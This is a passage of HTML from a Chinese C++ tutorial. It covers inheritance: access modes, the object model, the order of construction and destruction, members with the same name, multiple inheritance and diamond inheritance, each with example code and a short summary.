class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><br><span class="hljs-built_in">test01</span>();<br><br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>总结：</strong></p><p>继承的好处：<strong>可以减少重复的代码</strong></p><p>class A : public B; </p><p>A 类称为子类 或 派生类</p><p>B 类称为父类 或 基类</p><p><strong>派生类中的成员，包含两大部分</strong>：</p><p>一类是从基类继承过来的，一类是自己增加的成员。</p><p>从基类继承过过来的表现其共性，而新增的成员体现了其个性。</p><h4 id="4-6-2-继承方式"><a href="#4-6-2-继承方式" class="headerlink" title="4.6.2 继承方式"></a>4.6.2 继承方式</h4><p>继承的语法：<code>class 子类 : 继承方式  父类</code></p><p><strong>继承方式一共有三种：</strong></p><ul><li>公共继承</li><li>保护继承</li><li>私有继承</li></ul><p><strong>示例：</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Base1</span><br>&#123;<br><span class="hljs-keyword">public</span>: <br><span class="hljs-type">int</span> m_A;<br><span class="hljs-keyword">protected</span>:<br><span class="hljs-type">int</span> m_B;<br><span class="hljs-keyword">private</span>:<br><span class="hljs-type">int</span> m_C;<br>&#125;;<br><br><span class="hljs-comment">//公共继承</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Son1</span> :<span class="hljs-keyword">public</span> Base1<br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">func</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>m_A; <span class="hljs-comment">//可访问 public权限</span><br>m_B; <span class="hljs-comment">//可访问 protected权限</span><br><span class="hljs-comment">//m_C; //不可访问</span><br>&#125;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">myClass</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>Son1 s1;<br>s<span class="hljs-number">1.</span>m_A; <span class="hljs-comment">//其他类只能访问到公共权限</span><br>&#125;<br><br><span class="hljs-comment">//保护继承</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Base2</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-type">int</span> m_A;<br><span class="hljs-keyword">protected</span>:<br><span class="hljs-type">int</span> m_B;<br><span class="hljs-keyword">private</span>:<br><span class="hljs-type">int</span> m_C;<br>&#125;;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Son2</span>:<span class="hljs-keyword">protected</span> Base2<br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">func</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>m_A; <span class="hljs-comment">//可访问 protected权限</span><br>m_B; <span class="hljs-comment">//可访问 protected权限</span><br><span class="hljs-comment">//m_C; //不可访问</span><br>&#125;<br>&#125;;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">myClass2</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>Son2 s;<br><span class="hljs-comment">//s.m_A; //不可访问</span><br>&#125;<br><br><span class="hljs-comment">//私有继承</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Base3</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-type">int</span> m_A;<br><span class="hljs-keyword">protected</span>:<br><span class="hljs-type">int</span> m_B;<br><span class="hljs-keyword">private</span>:<br><span class="hljs-type">int</span> m_C;<br>&#125;;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Son3</span>:<span class="hljs-keyword">private</span> Base3<br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">func</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>m_A; <span class="hljs-comment">//可访问 private权限</span><br>m_B; <span class="hljs-comment">//可访问 private权限</span><br><span class="hljs-comment">//m_C; //不可访问</span><br>&#125;<br>&#125;;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">GrandSon3</span> :<span class="hljs-keyword">public</span> Son3<br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">func</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//Son3是私有继承，所以继承Son3的属性在GrandSon3中都无法访问到</span><br><span class="hljs-comment">//m_A;</span><br><span class="hljs-comment">//m_B;</span><br><span class="hljs-comment">//m_C;</span><br>&#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h4 id="4-6-3-继承中的对象模型"><a href="#4-6-3-继承中的对象模型" class="headerlink" title="4.6.3 继承中的对象模型"></a>4.6.3 继承中的对象模型</h4><p>**问题：**从父类继承过来的成员，哪些属于子类对象中？</p><p><strong>示例：</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Base</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-type">int</span> m_A;<br><span class="hljs-keyword">protected</span>:<br><span class="hljs-type">int</span> m_B;<br><span class="hljs-keyword">private</span>:<br><span class="hljs-type">int</span> m_C; <span class="hljs-comment">//私有成员只是被隐藏了，但是还是会继承下去</span><br>&#125;;<br><br><span class="hljs-comment">//公共继承</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Son</span> :<span class="hljs-keyword">public</span> Base<br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-type">int</span> m_D;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test01</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;sizeof Son = &quot;</span> &lt;&lt; <span class="hljs-built_in">sizeof</span>(Son) &lt;&lt; endl;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><br><span class="hljs-built_in">test01</span>();<br><br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>结论： 父类中私有成员也是被子类继承下去了，只是由编译器给隐藏后访问不到</p></blockquote><h4 id="4-6-4-继承中构造和析构顺序"><a href="#4-6-4-继承中构造和析构顺序" class="headerlink" title="4.6.4 继承中构造和析构顺序"></a>4.6.4 继承中构造和析构顺序</h4><p>子类继承父类后，当创建子类对象，也会调用父类的构造函数</p><p>问题：父类和子类的构造和析构顺序是谁先谁后？</p><p><strong>示例：</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Base</span> <br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-built_in">Base</span>()<br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;Base构造函数!&quot;</span> &lt;&lt; endl;<br>&#125;<br>~<span class="hljs-built_in">Base</span>()<br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;Base析构函数!&quot;</span> &lt;&lt; endl;<br>&#125;<br>&#125;;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Son</span> : <span class="hljs-keyword">public</span> Base<br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-built_in">Son</span>()<br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;Son构造函数!&quot;</span> &lt;&lt; endl;<br>&#125;<br>~<span class="hljs-built_in">Son</span>()<br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;Son析构函数!&quot;</span> &lt;&lt; endl;<br>&#125;<br><br>&#125;;<br><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test01</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//继承中 先调用父类构造函数，再调用子类构造函数，析构顺序与构造相反</span><br>Son s;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><br><span class="hljs-built_in">test01</span>();<br><br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>总结：继承中 先调用父类构造函数，再调用子类构造函数，析构顺序与构造相反</p></blockquote><h4 id="4-6-5-继承同名成员处理方式"><a href="#4-6-5-继承同名成员处理方式" class="headerlink" title="4.6.5 继承同名成员处理方式"></a>4.6.5 继承同名成员处理方式</h4><p>问题：当子类与父类出现同名的成员，如何通过子类对象，访问到子类或父类中同名的数据呢？</p><ul><li>访问子类同名成员   直接访问即可</li><li>访问父类同名成员   需要加作用域</li></ul><p><strong>示例：</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Base</span> &#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-built_in">Base</span>()<br>&#123;<br>m_A = <span class="hljs-number">100</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">func</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;Base - func()调用&quot;</span> &lt;&lt; endl;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">func</span><span class="hljs-params">(<span class="hljs-type">int</span> a)</span></span><br><span class="hljs-function"></span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;Base - func(int a)调用&quot;</span> &lt;&lt; endl;<br>&#125;<br><br><span class="hljs-keyword">public</span>:<br><span class="hljs-type">int</span> m_A;<br>&#125;;<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Son</span> : <span class="hljs-keyword">public</span> Base &#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-built_in">Son</span>()<br>&#123;<br>m_A = <span class="hljs-number">200</span>;<br>&#125;<br><br><span class="hljs-comment">//当子类与父类拥有同名的成员函数，子类会隐藏父类中所有版本的同名成员函数</span><br><span class="hljs-comment">//如果想访问父类中被隐藏的同名成员函数，需要加父类的作用域</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">func</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;Son - func()调用&quot;</span> &lt;&lt; endl;<br>&#125;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-type">int</span> m_A;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test01</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>Son s;<br><br>cout &lt;&lt; <span class="hljs-string">&quot;Son下的m_A = &quot;</span> &lt;&lt; s.m_A &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;Base下的m_A = &quot;</span> &lt;&lt; s.Base::m_A &lt;&lt; endl;<br><br>s.<span class="hljs-built_in">func</span>();<br>s.Base::<span class="hljs-built_in">func</span>();<br>s.Base::<span class="hljs-built_in">func</span>(<span class="hljs-number">10</span>);<br><br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><br><span class="hljs-built_in">test01</span>();<br><br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br><span class="hljs-keyword">return</span> EXIT_SUCCESS;<br>&#125;<br></code></pre></td></tr></table></figure><p>总结：</p><ol><li>子类对象可以直接访问到子类中同名成员</li><li>子类对象加作用域可以访问到父类同名成员</li><li>当子类与父类拥有同名的成员函数，子类会隐藏父类中同名成员函数，加作用域可以访问到父类中同名函数</li></ol><h4 id="4-6-6-继承同名静态成员处理方式"><a href="#4-6-6-继承同名静态成员处理方式" class="headerlink" title="4.6.6 继承同名静态成员处理方式"></a>4.6.6 继承同名静态成员处理方式</h4><p>问题：继承中同名的静态成员在子类对象上如何进行访问？</p><p>静态成员和非静态成员出现同名，处理方式一致</p><ul><li>访问子类同名成员   直接访问即可</li><li>访问父类同名成员   需要加作用域</li></ul><p><strong>示例：</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Base</span> &#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">func</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;Base - static void func()&quot;</span> &lt;&lt; endl;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">func</span><span class="hljs-params">(<span class="hljs-type">int</span> a)</span></span><br><span class="hljs-function"></span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;Base - static void func(int a)&quot;</span> &lt;&lt; endl;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> m_A;<br>&#125;;<br><br><span class="hljs-type">int</span> Base::m_A = <span class="hljs-number">100</span>;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Son</span> : <span class="hljs-keyword">public</span> Base &#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">func</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;Son - static void func()&quot;</span> &lt;&lt; endl;<br>&#125;<br><span class="hljs-type">static</span> <span class="hljs-type">int</span> m_A;<br>&#125;;<br><br><span class="hljs-type">int</span> Son::m_A = <span class="hljs-number">200</span>;<br><br><span class="hljs-comment">//同名成员属性</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test01</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//通过对象访问</span><br>cout &lt;&lt; <span class="hljs-string">&quot;通过对象访问： &quot;</span> &lt;&lt; endl;<br>Son s;<br>cout &lt;&lt; <span class="hljs-string">&quot;Son  下 m_A = &quot;</span> &lt;&lt; s.m_A &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;Base 下 m_A = &quot;</span> &lt;&lt; s.Base::m_A &lt;&lt; endl;<br><br><span class="hljs-comment">//通过类名访问</span><br>cout &lt;&lt; <span class="hljs-string">&quot;通过类名访问： &quot;</span> &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;Son  下 m_A = &quot;</span> &lt;&lt; Son::m_A &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;Base 下 m_A = &quot;</span> &lt;&lt; Son::Base::m_A &lt;&lt; endl;<br>&#125;<br><br><span class="hljs-comment">//同名成员函数</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test02</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//通过对象访问</span><br>cout &lt;&lt; <span class="hljs-string">&quot;通过对象访问： &quot;</span> &lt;&lt; endl;<br>Son s;<br>s.<span class="hljs-built_in">func</span>();<br>s.Base::<span class="hljs-built_in">func</span>();<br><br>cout &lt;&lt; <span class="hljs-string">&quot;通过类名访问： &quot;</span> &lt;&lt; endl;<br>Son::<span class="hljs-built_in">func</span>();<br>Son::Base::<span class="hljs-built_in">func</span>();<br><span class="hljs-comment">//出现同名，子类会隐藏掉父类中所有同名成员函数，需要加作作用域访问</span><br>Son::Base::<span class="hljs-built_in">func</span>(<span class="hljs-number">100</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><br><span class="hljs-comment">//test01();</span><br><span class="hljs-built_in">test02</span>();<br><br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>总结：同名静态成员处理方式和非静态处理方式一样，只不过有两种访问的方式（通过对象 和 通过类名）</p></blockquote><h4 id="4-6-7-多继承语法"><a href="#4-6-7-多继承语法" class="headerlink" title="4.6.7 多继承语法"></a>4.6.7 多继承语法</h4><p>C++允许<strong>一个类继承多个类</strong></p><p>语法：<code> class 子类 ：继承方式 父类1 ， 继承方式 父类2...</code></p><p>多继承可能会引发父类中有同名成员出现，需要加作用域区分</p><p><strong>C++实际开发中不建议用多继承</strong></p><p><strong>示例：</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Base1</span> &#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-built_in">Base1</span>()<br>&#123;<br>m_A = <span class="hljs-number">100</span>;<br>&#125;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-type">int</span> m_A;<br>&#125;;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Base2</span> &#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-built_in">Base2</span>()<br>&#123;<br>m_A = <span class="hljs-number">200</span>;  <span class="hljs-comment">//开始是m_B 不会出问题，但是改为mA就会出现不明确</span><br>&#125;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-type">int</span> m_A;<br>&#125;;<br><br><span class="hljs-comment">//语法：class 子类：继承方式 父类1 ，继承方式 父类2 </span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Son</span> : <span class="hljs-keyword">public</span> Base2, <span class="hljs-keyword">public</span> Base1 <br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-built_in">Son</span>()<br>&#123;<br>m_C = <span class="hljs-number">300</span>;<br>m_D = <span class="hljs-number">400</span>;<br>&#125;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-type">int</span> m_C;<br><span class="hljs-type">int</span> m_D;<br>&#125;;<br><br><br><span class="hljs-comment">//多继承容易产生成员同名的情况</span><br><span class="hljs-comment">//通过使用类名作用域可以区分调用哪一个基类的成员</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test01</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>Son s;<br>cout &lt;&lt; <span class="hljs-string">&quot;sizeof Son = &quot;</span> &lt;&lt; <span class="hljs-built_in">sizeof</span>(s) &lt;&lt; endl;<br>cout &lt;&lt; s.Base1::m_A &lt;&lt; endl;<br>cout &lt;&lt; s.Base2::m_A &lt;&lt; endl;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><br><span class="hljs-built_in">test01</span>();<br><br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>总结： 多继承中如果父类中出现了同名情况，子类使用时候要加作用域</p></blockquote><h4 id="4-6-8-菱形继承"><a href="#4-6-8-菱形继承" class="headerlink" title="4.6.8 菱形继承"></a>4.6.8 菱形继承</h4><p><strong>菱形继承概念：</strong></p><ul><li>两个派生类继承同一个基类</li><li>又有某个类同时继承者两个派生类</li><li>这种继承被称为菱形继承，或者钻石继承</li></ul><p><strong>菱形继承问题：</strong></p><ol><li><pre><code class="hljs">羊继承了动物的数据，驼同样继承了动物的数据，当草泥马使用数据时，就会产生二义性。</code></pre></li><li><pre><code class="hljs">草泥马继承自动物的数据继承了两份，其实我们应该清楚，这份数据我们只需要一份就可以。</code></pre></li></ol><p><strong>示例：</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-type">int</span> m_Age;<br>&#125;;<br><br><span class="hljs-comment">//继承前加virtual关键字后，变为虚继承</span><br><span class="hljs-comment">//此时公共的父类Animal称为虚基类</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Sheep</span> : <span class="hljs-keyword">virtual</span> <span class="hljs-keyword">public</span> Animal &#123;&#125;;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Tuo</span>   : <span class="hljs-keyword">virtual</span> <span class="hljs-keyword">public</span> Animal &#123;&#125;;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">SheepTuo</span> : <span class="hljs-keyword">public</span> Sheep, <span class="hljs-keyword">public</span> Tuo &#123;&#125;;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test01</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>SheepTuo st;<br>st.Sheep::m_Age = <span class="hljs-number">100</span>;<br>st.Tuo::m_Age = <span class="hljs-number">200</span>;<br><br>cout &lt;&lt; <span class="hljs-string">&quot;st.Sheep::m_Age = &quot;</span> &lt;&lt; st.Sheep::m_Age &lt;&lt; endl;<br>cout &lt;&lt; 